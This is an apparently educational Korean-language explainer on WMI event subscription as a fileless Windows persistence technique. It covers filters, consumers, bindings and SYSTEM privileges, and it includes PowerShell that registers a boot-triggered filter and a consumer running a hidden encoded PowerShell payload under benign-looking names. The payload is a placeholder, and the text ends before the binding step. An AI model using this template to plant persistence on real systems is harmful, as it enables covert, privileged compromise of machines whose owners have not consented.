WMI Event Subscription

WMI 이벤트 트리거로 악성 코드 자동 실행 — 파일리스 지속성

#1. WMI 이벤트 구독이란?

🔧 ➜ 📡 ➜ ⚡ ➜ 💀

"시스템 이벤트에 함정 설치하기"

WMI(Windows Management Instrumentation)는 Windows 시스템을 관리하는 강력한 프레임워크입니다. WMI 이벤트 구독을 사용하면 특정 시스템 이벤트(예: 부팅, 로그인, 프로세스 시작)가 발생할 때 자동으로 스크립트나 프로그램을 실행할 수 있습니다. 공격자는 이 기능을 악용하여 파일리스(fileless) 지속성을 확보합니다.

WMI 이벤트 구독의 3가지 구성 요소

# 1. Event Filter - 트리거 조건 (언제?)
SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200
# 2. Event Consumer - 실행할 동작 (무엇을?)
CommandLineEventConsumer: cmd.exe /c powershell -enc [base64_payload]
# 3. Binding - 필터와 컨슈머 연결
__FilterToConsumerBinding: Filter → Consumer

왜 특히 위험한가?

파일리스 실행

악성 코드가 WMI 저장소에만 존재하므로 디스크 스캔으로 탐지 불가합니다.

SYSTEM 권한

WMI 서비스(wmiprvse.exe)는 SYSTEM으로 실행되어 최고 권한을 가집니다.

#2. 공격 기법 분석

PowerShell로 WMI 영구 구독 생성

# Event Filter - 시스템 부팅 200초 후 트리거
$filter = Set-WmiInstance -Namespace root\subscription
  -Class __EventFilter -Arguments @{
    Name = 'SystemHealthCheck'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent..."
  }

# Consumer - 악성 명령 실행
$consumer = Set-WmiInstance -Namespace root\subscription
  -Class CommandLineEventConsumer -Arguments @{
    Name = 'SystemHealthAction'
    CommandLineTemplate = 'cmd /c powershell -w hidden -enc [payload]'
  }
